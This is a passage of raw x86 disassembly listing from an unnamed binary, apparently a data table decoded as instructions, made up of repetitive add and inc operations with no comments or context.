  439b1c:	add    BYTE PTR [edi+edi*8],dh
  439b1f:	add    BYTE PTR [eax],al
  439b21:	cmp    edi,edi
  439b23:	add    BYTE PTR [eax],al
  439b25:	xor    eax,0x310000ff
  439b2a:	inc    DWORD PTR [eax]
  439b2c:	add    BYTE PTR [edi],ch
  439b2e:	inc    DWORD PTR [eax]
  439b30:	add    BYTE PTR [edi],bh
  439b32:	inc    DWORD PTR [eax]
  439b34:	add    BYTE PTR [edx],ch
  439b36:	inc    DWORD PTR [eax]
  439b38:	add    BYTE PTR [edx],bl
  439b3a:	inc    DWORD PTR [eax]
  439b3c:	add    BYTE PTR ds:0x2b0000ff,dh
  439b42:	inc    DWORD PTR [edx]
  439b44:	add    ah,BYTE PTR ds:0x1b0000fd
  439b4a:	inc    DWORD PTR [eax]
  439b4c:	add    BYTE PTR [edi],dl
  439b4e:	inc    DWORD PTR [eax]
  439b50:	add    BYTE PTR [esi],bl
  439b52:	inc    DWORD PTR [eax]
  439b54:	add    BYTE PTR [edi+edi*8],ah
  439b57:	add    BYTE PTR [eax],al
  439b59:	inc    DWORD PTR es:[eax]
  439b5c:	add    BYTE PTR [ecx],dh
  439b5e:	inc    DWORD PTR [eax]
  439b60:	add    BYTE PTR ds:0x240000ff,ah
  439b66:	inc    DWORD PTR [eax]
  439b68:	add    BYTE PTR ds:0x250000ff,bl
  439b6e:	inc    DWORD PTR [eax]
  439b70:	add    BYTE PTR ds:0x250000ff,ch
  439b76:	inc    DWORD PTR [eax]
  439b78:	add    BYTE PTR [esi],dl
  439b7a:	inc    DWORD PTR [eax]
  439b7c:	add    BYTE PTR [edi],bl
  439b7e:	inc    DWORD PTR [eax]
  439b80:	add    BYTE PTR [esi],dl
  439b82:	inc    DWORD PTR [eax]
  439b84:	add    BYTE PTR ds:0x360000ff,ch
  439b8a:	inc    DWORD PTR [eax]
  439b8c:	add    BYTE PTR [edi],dh
  439b8e:	inc    DWORD PTR [eax]
  439b90:	add    BYTE PTR [esi],dh
  439b92:	inc    DWORD PTR [eax]
  439b94:	add    BYTE PTR [ebx-0x1],al
  439b97:	add    BYTE PTR [eax],al
  439b99:	cmp    edi,edi
  439b9b:	add    BYTE PTR [eax],al
  439b9d:	inc    DWORD PTR cs:[eax]
  439ba0:	add    BYTE PTR [eax-0x1],al
  439ba3:	add    BYTE PTR [eax],al
  439ba5:	dec    ebp
  439ba6:	inc    DWORD PTR [eax]
  439ba8:	add    BYTE PTR [ebx],bh
  439baa:	inc    DWORD PTR [eax]
  439bac:	add    BYTE PTR [edx],bh
  439bae:	inc    DWORD PTR [eax]
  439bb0:	add    BYTE PTR [edi],bh
  439bb2:	inc    DWORD PTR [eax]
  439bb4:	add    BYTE PTR [edi+edi*8],dh
  439bb7:	add    BYTE PTR [eax],al
  439bb9:	cmp    bh,bh
  439bbb:	add    BYTE PTR [eax],al
  439bbd:	sub    al,0xff
  439bbf:	add    BYTE PTR [eax],al
  439bc1:	daa    
  439bc2:	inc    DWORD PTR [eax]
  439bc4:	add    BYTE PTR [esi],ah
  439bc6:	inc    DWORD PTR [eax]
  439bc8:	add    BYTE PTR [esi],ah
  439bca:	inc    DWORD PTR [eax]
  439bcc:	add    BYTE PTR [edx-0x1],al
  439bcf:	add    BYTE PTR [eax],al
  439bd1:	inc    DWORD PTR ss:[eax]
  439bd4:	add    BYTE PTR [edi],ch
  439bd6:	inc    DWORD PTR [eax]
  439bd8:	add    BYTE PTR [edi+edi*8],bh
  439bdb:	add    BYTE PTR [eax],al
  439bdd:	inc    eax
  439bde:	inc    DWORD PTR [eax]
  439be0:	add    BYTE PTR [edi+edi*8],ch
  439be3:	add    BYTE PTR [eax],al
  439be5:	xor    edi,edi
  439be7:	add    BYTE PTR [eax],al
  439be9:	xor    eax,0x240000ff
  439bee:	inc    DWORD PTR [eax]
  439bf0:	add    BYTE PTR [ebx-0x1],cl
  439bf3:	add    BYTE PTR [eax],al
  439bf5:	cmp    al,0xff
  439bf7:	add    BYTE PTR [eax],al
  439bf9:	and    bh,bh
  439bfb:	add    BYTE PTR [eax],al
  439bfd:	inc    ebx
  439bfe:	inc    DWORD PTR [eax]
  439c00:	add    BYTE PTR [ebx],bh
  439c02:	inc    DWORD PTR [eax]
  439c04:	add    BYTE PTR [ebx-0x1],dl
  439c07:	add    BYTE PTR [eax],al
  439c09:	sbb    al,0xff
  439c0b:	add    BYTE PTR [eax],al
  439c0d:	aas    
  439c0e:	inc    DWORD PTR [eax]
  439c10:	add    BYTE PTR [ecx],ch
  439c12:	inc    DWORD PTR [eax]
  439c14:	add    BYTE PTR [edx-0x1],al
  439c17:	add    BYTE PTR [eax],al
  439c19:	dec    eax
  439c1a:	inc    DWORD PTR [eax]
  439c1c:	add    BYTE PTR [edi],dh
  439c1e:	inc    DWORD PTR [eax]
  439c20:	add    BYTE PTR [edi],ah
  439c22:	inc    DWORD PTR [eax]
  439c24:	add    BYTE PTR ds:0x320000ff,bh
  439c2a:	inc    DWORD PTR [eax]
  439c2c:	add    BYTE PTR ds:0x500000ff,dh
  439c32:	inc    DWORD PTR [eax]
  439c34:	add    BYTE PTR [ebx],dh
  439c36:	inc    DWORD PTR [eax]
  439c38:	add    BYTE PTR [edx-0x1],dl
  439c3b:	add    BYTE PTR [eax],al
  439c3d:	push   esp
  439c3e:	inc    DWORD PTR [eax]
  439c40:	add    BYTE PTR [edx-0x1],al
  439c43:	add    BYTE PTR [eax],al
  439c45:	inc    eax
  439c46:	inc    DWORD PTR [eax]
  439c48:	add    BYTE PTR [ebx],dh
  439c4a:	inc    DWORD PTR [eax]
  439c4c:	add    BYTE PTR [edx-0x1],al
  439c4f:	add    BYTE PTR [eax],al
  439c51:	push   edi
  439c52:	inc    DWORD PTR [eax]
  439c54:	add    BYTE PTR [edi+edi*8+0x0],cl
  439c58:	add    BYTE PTR [ebx-0x1],cl
  439c5b:	add    BYTE PTR [eax],al
  439c5d:	dec    edi
  439c5e:	inc    DWORD PTR [eax]
  439c60:	add    BYTE PTR [ebp-0x1],cl
  439c63:	add    BYTE PTR [eax],al
  439c65:	push   ecx
  439c66:	inc    DWORD PTR [eax]
  439c68:	add    BYTE PTR [edx-0x1],dl
  439c6b:	add    BYTE PTR [eax],al
  439c6d:	inc    esi
  439c6e:	inc    DWORD PTR [eax]
  439c70:	add    BYTE PTR [ebp-0x1],cl
  439c73:	add    BYTE PTR [eax],al
  439c75:	push   esp
  439c76:	inc    DWORD PTR [eax]
  439c78:	add    BYTE PTR [edx-0x1],cl
  439c7b:	add    BYTE PTR [eax],al
  439c7d:	dec    edi
  439c7e:	inc    DWORD PTR [eax]
  439c80:	add    BYTE PTR [edi-0x1],cl
  439c83:	add    BYTE PTR [eax],al
  439c85:	inc    ebx
  439c86:	inc    DWORD PTR [eax]
  439c88:	add    BYTE PTR [edx],dh
  439c8a:	inc    DWORD PTR [eax]
  439c8c:	add    BYTE PTR [ebp-0x1],al
  439c8f:	add    BYTE PTR [eax],al
  439c91:	inc    esi
  439c92:	inc    DWORD PTR [eax]
  439c94:	add    BYTE PTR [edi],dh
  439c96:	inc    DWORD PTR [eax]
  439c98:	add    BYTE PTR [esi],dh
  439c9a:	inc    DWORD PTR [eax]
  439c9c:	add    BYTE PTR [eax-0x1],al
  439c9f:	add    BYTE PTR [eax],al
  439ca1:	das    
  439ca2:	inc    DWORD PTR [eax]
  439ca4:	add    BYTE PTR [edi],bh
  439ca6:	inc    DWORD PTR [eax]
  439ca8:	add    BYTE PTR [edx-0x1],al
  439cab:	add    BYTE PTR [eax],al
  439cad:	inc    DWORD PTR ss:[eax]
  439cb0:	add    BYTE PTR [edx-0x1],cl
  439cb3:	add    BYTE PTR [eax],al
  439cb5:	dec    esi
  439cb6:	inc    DWORD PTR [eax]
  439cb8:	add    BYTE PTR [eax-0x1],al
  439cbb:	add    BYTE PTR [eax],al
  439cbd:	inc    ebx
  439cbe:	inc    DWORD PTR [eax]
  439cc0:	add    BYTE PTR [ebp-0x1],al
  439cc3:	add    BYTE PTR [eax],al
  439cc5:	push   ebx
  439cc6:	inc    DWORD PTR [eax]
  439cc8:	add    BYTE PTR [edx],dh
  439cca:	inc    DWORD PTR [eax]
  439ccc:	add    BYTE PTR [ebx],dh
  439cce:	inc    DWORD PTR [eax]
  439cd0:	add    BYTE PTR [edi],ch
  439cd2:	inc    DWORD PTR [eax]
  439cd4:	add    BYTE PTR [edi],dh
  439cd6:	inc    DWORD PTR [eax]
  439cd8:	add    BYTE PTR ds:0x3a0000ff,ch
  439cde:	inc    DWORD PTR [eax]
  439ce0:	add    BYTE PTR [ebx],bh
  439ce2:	inc    DWORD PTR [eax]
  439ce4:	add    BYTE PTR ds:0x370000ff,bh
  439cea:	inc    DWORD PTR [eax]
  439cec:	add    BYTE PTR [esi],dh
  439cee:	inc    DWORD PTR [eax]
  439cf0:	add    BYTE PTR [ebx],bh
  439cf2:	inc    DWORD PTR [eax]
  439cf4:	add    BYTE PTR [esi],ch
  439cf6:	inc    DWORD PTR [eax]
  439cf8:	add    BYTE PTR [edx-0x1],al
  439cfb:	add    BYTE PTR [eax],al
  439cfd:	cmp    bh,bh
  439cff:	add    BYTE PTR [eax],al
  439d01:	sub    eax,0x450000ff
  439d06:	inc    DWORD PTR [eax]
  439d08:	add    BYTE PTR [eax],dh
  439d0a:	inc    DWORD PTR [eax]
  439d0c:	add    BYTE PTR [esi],dh
  439d0e:	inc    DWORD PTR [eax]
  439d10:	add    BYTE PTR [edi],ah
  439d12:	inc    DWORD PTR [eax]
  439d14:	add    BYTE PTR [eax],bh
  439d16:	inc    DWORD PTR [eax]
  439d18:	add    BYTE PTR [edx],ch
  439d1a:	inc    DWORD PTR [eax]
  439d1c:	add    BYTE PTR [edx],dh
  439d1e:	inc    DWORD PTR [eax]
  439d20:	add    BYTE PTR [esi],dh
  439d22:	inc    DWORD PTR [eax]
  439d24:	add    BYTE PTR [eax-0x1],al
  439d27:	add    BYTE PTR [eax],al
  439d29:	sub    eax,0x310000ff
  439d2e:	inc    DWORD PTR [eax]
  439d30:	add    BYTE PTR [ecx],dh
  439d32:	inc    DWORD PTR [eax]
  439d34:	add    BYTE PTR [ecx-0x1],al
  439d37:	add    BYTE PTR [eax],al
  439d39:	xor    bh,bh
  439d3b:	add    BYTE PTR [eax],al
  439d3d:	xor    bh,bh
  439d3f:	add    BYTE PTR [eax],al
  439d41:	and    eax,0x240000ff
  439d46:	inc    DWORD PTR [eax]
  439d48:	add    BYTE PTR [eax],bl
  439d4a:	inc    DWORD PTR [eax]
  439d4c:	add    BYTE PTR [esi],bl
  439d4e:	inc    DWORD PTR [eax]
  439d50:	add    BYTE PTR [ecx],ch
  439d52:	inc    DWORD PTR [eax]
  439d54:	add    BYTE PTR [edi],bl
  439d56:	inc    DWORD PTR [eax]
  439d58:	add    BYTE PTR [esi],bl
  439d5a:	inc    DWORD PTR [eax]
  439d5c:	add    BYTE PTR [edx],ah
  439d5e:	inc    DWORD PTR [eax]
  439d60:	add    BYTE PTR [edi],dh
  439d62:	inc    DWORD PTR [eax]
  439d64:	add    BYTE PTR [eax],ch
  439d66:	inc    DWORD PTR [eax]
  439d68:	add    BYTE PTR [edi],ch
  439d6a:	inc    DWORD PTR [eax]
  439d6c:	add    BYTE PTR ds:0x1c0000ff,ah
  439d72:	inc    DWORD PTR [eax]
  439d74:	add    BYTE PTR [edi+edi*8],dh
  439d77:	add    BYTE PTR [eax],al
  439d79:	cmp    edi,edi
  439d7b:	add    BYTE PTR [eax],al
  439d7d:	pop    ds
  439d7e:	inc    DWORD PTR [eax]
  439d80:	add    BYTE PTR [edi+edi*8],dh
  439d83:	add    BYTE PTR [eax],al
  439d85:	sub    bh,bh
  439d87:	add    BYTE PTR [eax],al
  439d89:	and    bh,bh
  439d8b:	add    BYTE PTR [eax],al
  439d8d:	sub    eax,0x2f0000ff
  439d92:	inc    DWORD PTR [eax]
  439d94:	add    BYTE PTR [ecx],ch
  439d96:	inc    DWORD PTR [eax]
  439d98:	add    BYTE PTR [eax],ch
  439d9a:	inc    DWORD PTR [eax]
  439d9c:	add    BYTE PTR ds:0x1f0000ff,ah
  439da2:	inc    DWORD PTR [eax]
  439da4:	add    BYTE PTR [edx],dh
  439da6:	inc    DWORD PTR [eax]
  439da8:	add    BYTE PTR [edx],ch
  439daa:	inc    DWORD PTR [eax]
  439dac:	add    BYTE PTR [edx-0x1],cl
  439daf:	add    BYTE PTR [eax],al
  439db1:	xor    bh,bh
  439db3:	add    BYTE PTR [eax],al
  439db5:	cmp    al,0xff
  439db7:	add    BYTE PTR [eax],al
  439db9:	dec    esp
  439dba:	inc    DWORD PTR [eax]
  439dbc:	add    BYTE PTR [ebx],dh
  439dbe:	inc    DWORD PTR [eax]
  439dc0:	add    BYTE PTR [edx-0x1],al
  439dc3:	add    BYTE PTR [eax],al
  439dc5:	inc    DWORD PTR ss:[eax]
  439dc8:	add    BYTE PTR ds:0x400000ff,bh
  439dce:	inc    DWORD PTR [eax]
  439dd0:	add    BYTE PTR [esi],dh
  439dd2:	inc    DWORD PTR [eax]
  439dd4:	add    BYTE PTR [ebx],ch
  439dd6:	inc    DWORD PTR [eax]
  439dd8:	add    BYTE PTR [ebx],ch
  439dda:	inc    DWORD PTR [eax]
  439ddc:	add    BYTE PTR [ebp-0x1],al
  439ddf:	add    BYTE PTR [eax],al
  439de1:	push   eax
  439de2:	inc    DWORD PTR [eax]
  439de4:	add    BYTE PTR [edx],dh
  439de6:	inc    DWORD PTR [eax]
  439de8:	add    BYTE PTR [ebx],ch
  439dea:	inc    DWORD PTR [eax]
  439dec:	add    BYTE PTR [edx],bh
  439dee:	inc    DWORD PTR [eax]
  439df0:	add    BYTE PTR [edx],dh
  439df2:	inc    DWORD PTR [eax]
  439df4:	add    BYTE PTR ds:0x4d0000ff,dh
  439dfa:	inc    DWORD PTR [eax]
  439dfc:	add    BYTE PTR [ebx-0x1],al
  439dff:	add    BYTE PTR [eax],al
  439e01:	inc    esi
  439e02:	inc    DWORD PTR [eax]
  439e04:	add    BYTE PTR [ebx-0x1],al
  439e07:	add    BYTE PTR [eax],al
  439e09:	xor    eax,0x440000ff
  439e0e:	inc    DWORD PTR [eax]
  439e10:	add    BYTE PTR [edx],dh
  439e12:	inc    DWORD PTR [eax]
  439e14:	add    BYTE PTR [edi],ah
  439e16:	inc    DWORD PTR [eax]
  439e18:	add    BYTE PTR [ebx-0x1],cl
  439e1b:	add    BYTE PTR [eax],al
  439e1d:	dec    edx
  439e1e:	inc    DWORD PTR [eax]
  439e20:	add    BYTE PTR [ebx-0x1],cl
  439e23:	add    BYTE PTR [eax],al
  439e25:	cmp    edi,edi
  439e27:	add    BYTE PTR [eax],al
  439e29:	cmp    al,0xff
  439e2b:	add    BYTE PTR [eax],al
  439e2d:	xor    eax,0x3b0000ff
  439e32:	inc    DWORD PTR [eax]
  439e34:	add    BYTE PTR [esi],bh
  439e36:	inc    DWORD PTR [eax]
  439e38:	add    BYTE PTR [ebp-0x1],al
  439e3b:	add    BYTE PTR [eax],al
  439e3d:	pop    eax
  439e3e:	inc    DWORD PTR [eax]
  439e40:	add    BYTE PTR [edx-0x1],ah
  439e43:	add    BYTE PTR [eax],al
  439e45:	dec    esi
  439e46:	inc    DWORD PTR [eax]
  439e48:	add    BYTE PTR [ebx-0x1],bl
  439e4b:	add    BYTE PTR [eax],al
  439e4d:	dec    ecx
  439e4e:	inc    DWORD PTR [eax]
  439e50:	add    BYTE PTR [ecx-0x1],al
  439e53:	add    BYTE PTR [eax],al
  439e55:	push   ebx
  439e56:	inc    DWORD PTR [eax]
  439e58:	add    BYTE PTR [edx-0x1],dl
  439e5b:	add    BYTE PTR [eax],al
  439e5d:	inc    DWORD PTR [bx+si]
  439e60:	add    BYTE PTR [esi-0x1],dl
  439e63:	add    BYTE PTR [eax],al
  439e65:	dec    ebx
  439e66:	inc    DWORD PTR [eax]
  439e68:	add    BYTE PTR [esi-0x1],cl
  439e6b:	add    BYTE PTR [eax],al
  439e6d:	pop    ebp
  439e6e:	inc    DWORD PTR [eax]
  439e70:	add    BYTE PTR [ecx-0x1],al
  439e73:	add    BYTE PTR [eax],al
  439e75:	push   esp
  439e76:	inc    DWORD PTR [eax]
  439e78:	add    BYTE PTR [ebp-0x1],al
  439e7b:	add    BYTE PTR [eax],al
  439e7d:	xor    edi,edi
  439e7f:	add    BYTE PTR [eax],al
  439e81:	push   ecx
  439e82:	inc    DWORD PTR [eax]
  439e84:	add    BYTE PTR [eax-0x1],cl
  439e87:	add    BYTE PTR [eax],al
  439e89:	xor    eax,0x360000ff
  439e8e:	inc    DWORD PTR [eax]
  439e90:	add    BYTE PTR [edi+edi*8],bh
  439e93:	add    BYTE PTR [eax],al
  439e95:	inc    ecx
  439e96:	inc    DWORD PTR [eax]
  439e98:	add    BYTE PTR [edi-0x1],al
  439e9b:	add    BYTE PTR [eax],al
  439e9d:	inc    ebp
  439e9e:	inc    DWORD PTR [eax]
  439ea0:	add    BYTE PTR [eax],bh
  439ea2:	inc    DWORD PTR [eax]
  439ea4:	add    BYTE PTR [edi-0x1],al
  439ea7:	add    BYTE PTR [eax],al
  439ea9:	cmp    al,0xff
  439eab:	add    BYTE PTR [eax],al
  439ead:	cmp    bh,bh
  439eaf:	add    BYTE PTR [eax],al
  439eb1:	cmp    eax,0x460000ff
  439eb6:	inc    DWORD PTR [eax]
  439eb8:	add    BYTE PTR [edx],bh
  439eba:	inc    DWORD PTR [eax]
  439ebc:	add    BYTE PTR [eax-0x1],al
  439ebf:	add    BYTE PTR [eax],al
  439ec1:	inc    edi
  439ec2:	inc    DWORD PTR [eax]
  439ec4:	add    BYTE PTR [esi-0x1],al
  439ec7:	add    BYTE PTR [eax],al
  439ec9:	dec    ecx
  439eca:	inc    DWORD PTR [eax]
  439ecc:	add    BYTE PTR [ecx],bh
  439ece:	inc    DWORD PTR [eax]
  439ed0:	add    BYTE PTR [ebx-0x1],cl
  439ed3:	add    BYTE PTR [eax],al
  439ed5:	cmp    bh,bh
  439ed7:	add    BYTE PTR [eax],al
  439ed9:	xor    eax,0x2c0000ff
  439ede:	inc    DWORD PTR [eax]
  439ee0:	add    BYTE PTR ds:0x380000ff,dh
  439ee6:	inc    DWORD PTR [eax]
  439ee8:	add    BYTE PTR [ecx-0x1],dl
  439eeb:	add    BYTE PTR [eax],al
  439eed:	inc    edi
  439eee:	inc    DWORD PTR [eax]
  439ef0:	add    BYTE PTR [edi-0x1],al
  439ef3:	add    BYTE PTR [eax],al
  439ef5:	sub    eax,0x370000ff
  439efa:	inc    DWORD PTR [eax]
  439efc:	add    BYTE PTR [esi],dh
  439efe:	inc    DWORD PTR [eax]
  439f00:	add    BYTE PTR [eax],dh
  439f02:	inc    DWORD PTR [eax]
  439f04:	add    BYTE PTR [ebx],dh
  439f06:	inc    DWORD PTR [eax]
  439f08:	add    BYTE PTR [edi+edi*8],bh
  439f0b:	add    BYTE PTR [eax],al
  439f0d:	sub    al,0xff
  439f0f:	add    BYTE PTR [eax],al
  439f11:	sub    bh,bh
  439f13:	add    BYTE PTR [eax],al
  439f15:	cmp    edi,edi
  439f17:	add    BYTE PTR [eax],al
  439f19:	xor    eax,0x2b0000ff
  439f1e:	inc    DWORD PTR [eax]
  439f20:	add    BYTE PTR [edi],ch
  439f22:	inc    DWORD PTR [eax]
  439f24:	add    BYTE PTR [edx],ah
  439f26:	inc    DWORD PTR [eax]
  439f28:	add    BYTE PTR [edx],bh
  439f2a:	inc    DWORD PTR [eax]
  439f2c:	add    BYTE PTR [edx],bh
  439f2e:	inc    DWORD PTR [eax]
  439f30:	add    BYTE PTR [ebx],ah
  439f32:	inc    DWORD PTR [eax]
  439f34:	add    BYTE PTR [ebx],ch
  439f36:	inc    DWORD PTR [eax]
  439f38:	add    BYTE PTR [esi],bh
  439f3a:	inc    DWORD PTR [eax]
  439f3c:	add    BYTE PTR ds:0x3a0000ff,bh
  439f42:	inc    DWORD PTR [eax]
  439f44:	add    BYTE PTR [esi],ah
  439f46:	inc    DWORD PTR [eax]
  439f48:	add    BYTE PTR [edx],ah
  439f4a:	inc    DWORD PTR [eax]
  439f4c:	add    BYTE PTR [ecx],bl
  439f4e:	inc    DWORD PTR [eax]
  439f50:	add    BYTE PTR ds:0x200000ff,ah
  439f56:	inc    DWORD PTR [eax]
  439f58:	add    BYTE PTR [ebx],ah
  439f5a:	inc    DWORD PTR [eax]
  439f5c:	add    BYTE PTR [ebx],ah
  439f5e:	inc    DWORD PTR [eax]
  439f60:	add    BYTE PTR [eax],ch
  439f62:	inc    DWORD PTR [eax]
  439f64:	add    BYTE PTR [ebx],ah
  439f66:	inc    DWORD PTR [eax]
  439f68:	add    BYTE PTR [edx],ch
  439f6a:	inc    DWORD PTR [eax]
  439f6c:	add    BYTE PTR [ecx],dh
  439f6e:	inc    DWORD PTR [eax]
  439f70:	add    BYTE PTR [esi],ah
  439f72:	inc    DWORD PTR [eax]
  439f74:	add    BYTE PTR [edx],ah
  439f76:	inc    DWORD PTR [eax]
  439f78:	add    BYTE PTR [eax],ch
  439f7a:	inc    DWORD PTR [eax]
  439f7c:	add    BYTE PTR [edi],dl
  439f7e:	inc    DWORD PTR [eax]
  439f80:	add    BYTE PTR [esi],dh
  439f82:	inc    DWORD PTR [eax]
  439f84:	add    BYTE PTR [edi],cl
  439f86:	inc    DWORD PTR [eax]
  439f88:	add    BYTE PTR [esi],dl
  439f8a:	inc    DWORD PTR [eax]
  439f8c:	add    BYTE PTR [eax],ah
  439f8e:	inc    DWORD PTR [eax]
  439f90:	add    BYTE PTR [edi],ah
  439f92:	inc    DWORD PTR [eax]
  439f94:	add    BYTE PTR [ecx],ch
  439f96:	inc    DWORD PTR [eax]
  439f98:	add    BYTE PTR [eax-0x1],cl
  439f9b:	add    BYTE PTR [eax],al
  439f9d:	and    bh,bh
  439f9f:	add    BYTE PTR [eax],al
  439fa1:	and    edi,edi
  439fa3:	add    BYTE PTR [eax],al
  439fa5:	xor    edi,edi
  439fa7:	add    BYTE PTR [eax],al
  439fa9:	cmp    bh,bh
  439fab:	add    BYTE PTR [eax],al
  439fad:	cmp    bh,bh
  439faf:	add    BYTE PTR [eax],al
  439fb1:	sub    al,0xff
  439fb3:	add    BYTE PTR [eax],al
  439fb5:	sub    eax,0x340000ff
  439fba:	inc    DWORD PTR [eax]
  439fbc:	add    BYTE PTR [esi],ch
  439fbe:	inc    DWORD PTR [eax]
  439fc0:	add    BYTE PTR [ebx],ch
  439fc2:	inc    DWORD PTR [eax]
  439fc4:	add    BYTE PTR [ecx],ch
  439fc6:	inc    DWORD PTR [eax]
  439fc8:	add    BYTE PTR [eax-0x1],cl
  439fcb:	add    BYTE PTR [eax],al
  439fcd:	cmp    edi,edi
  439fcf:	add    BYTE PTR [eax],al
  439fd1:	xor    al,0xff
  439fd3:	add    BYTE PTR [eax],al
  439fd5:	dec    ecx
  439fd6:	inc    DWORD PTR [eax]
  439fd8:	add    BYTE PTR [edi+edi*8+0x0],al
  439fdc:	add    BYTE PTR [edi-0x1],cl
  439fdf:	add    BYTE PTR [eax],al
  439fe1:	inc    DWORD PTR ds:[eax]
  439fe4:	add    BYTE PTR [eax],dh
  439fe6:	inc    DWORD PTR [eax]
  439fe8:	add    BYTE PTR [esi],ah
  439fea:	inc    DWORD PTR [eax]
  439fec:	add    BYTE PTR [edi+edi*8],ch
  439fef:	add    BYTE PTR [eax],al
  439ff1:	inc    ebp
  439ff2:	inc    DWORD PTR [eax]
  439ff4:	add    BYTE PTR [esi],dh
  439ff6:	inc    DWORD PTR [eax]
  439ff8:	add    BYTE PTR [ecx],dh
  439ffa:	inc    DWORD PTR [eax]
  439ffc:	add    BYTE PTR [edx-0x1],cl
  439fff:	add    BYTE PTR [eax],al
  43a001:	inc    ebx
  43a002:	inc    DWORD PTR [eax]
  43a004:	add    BYTE PTR [eax-0x1],cl
  43a007:	add    BYTE PTR [eax],al
  43a009:	cmp    al,0xff
  43a00b:	add    BYTE PTR [eax],al
  43a00d:	aas    
  43a00e:	inc    DWORD PTR [eax]
  43a010:	add    BYTE PTR [ecx],bh
  43a012:	inc    DWORD PTR [eax]
  43a014:	add    BYTE PTR [eax],ah
  43a016:	inc    DWORD PTR [eax]
  43a018:	add    BYTE PTR [eax],bh
  43a01a:	inc    DWORD PTR [eax]
  43a01c:	add    BYTE PTR [eax],bh
  43a01e:	inc    DWORD PTR [eax]
  43a020:	add    BYTE PTR [ecx],bh
  43a022:	inc    DWORD PTR [eax]
  43a024:	add    BYTE PTR [esi-0x1],dl
  43a027:	add    BYTE PTR [eax],al
  43a029:	push   ebx
  43a02a:	inc    DWORD PTR [eax]
  43a02c:	add    BYTE PTR [ebx-0x1],al
  43a02f:	add    BYTE PTR [eax],al
  43a031:	push   ebx
  43a032:	inc    DWORD PTR [eax]
  43a034:	add    BYTE PTR ds:0x410000ff,dh
  43a03a:	inc    DWORD PTR [eax]
  43a03c:	add    BYTE PTR [edi+edi*8],bh
  43a03f:	add    BYTE PTR [eax],al
  43a041:	inc    edi
  43a042:	inc    DWORD PTR [eax]
  43a044:	add    BYTE PTR [ebp-0x1],al
  43a047:	add    BYTE PTR [eax],al
  43a049:	pop    edi
  43a04a:	inc    DWORD PTR [eax]
  43a04c:	add    BYTE PTR [edi-0x1],dl
  43a04f:	add    BYTE PTR [eax],al
  43a051:	cmp    al,0xff
  43a053:	add    BYTE PTR [eax],al
  43a055:	pop    ecx
  43a056:	inc    DWORD PTR [eax]
  43a058:	add    BYTE PTR [edx-0x1],dl
  43a05b:	add    BYTE PTR [eax],al
  43a05d:	inc    DWORD PTR [bx+si]
  43a060:	add    BYTE PTR [edi-0x1],al
  43a063:	add    BYTE PTR [eax],al
  43a065:	inc    esp
  43a066:	inc    DWORD PTR [eax]
  43a068:	add    BYTE PTR [esi-0x1],dl
  43a06b:	add    BYTE PTR [eax],al
  43a06d:	dec    edi
  43a06e:	inc    DWORD PTR [eax]
  43a070:	add    BYTE PTR [edx-0x1],cl
  43a073:	add    BYTE PTR [eax],al
  43a075:	pop    ecx
  43a076:	inc    DWORD PTR [eax]
  43a078:	add    BYTE PTR [esi-0x1],cl
  43a07b:	add    BYTE PTR [eax],al
  43a07d:	cmp    edi,edi
  43a07f:	add    BYTE PTR [eax],al
  43a081:	inc    edi
  43a082:	inc    DWORD PTR [eax]
  43a084:	add    BYTE PTR [ebx-0x1],cl
  43a087:	add    BYTE PTR [eax],al
  43a089:	inc    esp
  43a08a:	inc    DWORD PTR [eax]
  43a08c:	add    BYTE PTR [edi+edi*8],bh
  43a08f:	add    BYTE PTR [eax],al
  43a091:	dec    ebx
  43a092:	inc    DWORD PTR [eax]
  43a094:	add    BYTE PTR [ebp-0x1],cl
  43a097:	add    BYTE PTR [eax],al
  43a099:	push   ebx
  43a09a:	inc    DWORD PTR [eax]
  43a09c:	add    BYTE PTR [ebp-0x1],cl
  43a09f:	add    BYTE PTR [eax],al
  43a0a1:	dec    eax
  43a0a2:	inc    DWORD PTR [eax]
  43a0a4:	add    BYTE PTR [ecx-0x1],cl
  43a0a7:	add    BYTE PTR [eax],al
  43a0a9:	cmp    bh,bh
  43a0ab:	add    BYTE PTR [eax],al
  43a0ad:	inc    eax
  43a0ae:	inc    DWORD PTR [eax]
  43a0b0:	add    BYTE PTR [edi+edi*8],bh
  43a0b3:	add    BYTE PTR [eax],al
  43a0b5:	dec    eax
  43a0b6:	inc    DWORD PTR [eax]
  43a0b8:	add    BYTE PTR [eax-0x1],cl
  43a0bb:	add    BYTE PTR [eax],al
  43a0bd:	inc    DWORD PTR ds:[eax]
  43a0c0:	add    BYTE PTR [esi],dh
  43a0c2:	inc    DWORD PTR [eax]
  43a0c4:	add    BYTE PTR [edi+edi*8],bh
  43a0c7:	add    BYTE PTR [eax],al
  43a0c9:	xor    al,0xff
  43a0cb:	add    BYTE PTR [eax],al
  43a0cd:	aaa    
  43a0ce:	inc    DWORD PTR [eax]
  43a0d0:	add    BYTE PTR [eax-0x1],cl
  43a0d3:	add    BYTE PTR [eax],al
  43a0d5:	cmp    al,0xff
  43a0d7:	add    BYTE PTR [eax],al
  43a0d9:	aas    
  43a0da:	inc    DWORD PTR [eax]
  43a0dc:	add    BYTE PTR [edi+edi*8],dh
  43a0df:	add    BYTE PTR [eax],al
  43a0e1:	aas    
  43a0e2:	inc    DWORD PTR [eax]
  43a0e4:	add    BYTE PTR [edx],dh
  43a0e6:	inc    DWORD PTR [eax]
  43a0e8:	add    BYTE PTR ds:0x360000ff,dh
  43a0ee:	inc    DWORD PTR [eax]
  43a0f0:	add    BYTE PTR [ebx],dh
  43a0f2:	inc    DWORD PTR [eax]
  43a0f4:	add    BYTE PTR [eax],ch
  43a0f6:	inc    DWORD PTR [eax]
  43a0f8:	add    BYTE PTR [ebx],ch
  43a0fa:	inc    DWORD PTR [eax]
  43a0fc:	add    BYTE PTR [edi+edi*8],ch
  43a0ff:	add    BYTE PTR [eax],al
  43a101:	sub    eax,0x1e0000ff
  43a106:	inc    DWORD PTR [eax]
  43a108:	add    BYTE PTR [ecx],ch
  43a10a:	inc    DWORD PTR [eax]
  43a10c:	add    BYTE PTR [ebx],dh
  43a10e:	inc    DWORD PTR [eax]
  43a110:	add    BYTE PTR [ecx],dh
  43a112:	inc    DWORD PTR [eax]
  43a114:	add    BYTE PTR [edx-0x1],al
  43a117:	add    BYTE PTR [eax],al
  43a119:	inc    DWORD PTR cs:[eax]
  43a11c:	add    BYTE PTR [edi],ch
  43a11e:	inc    DWORD PTR [eax]
  43a120:	add    BYTE PTR [edx],dh
  43a122:	inc    DWORD PTR [eax]
  43a124:	add    BYTE PTR [ebx],ch
  43a126:	inc    DWORD PTR [eax]
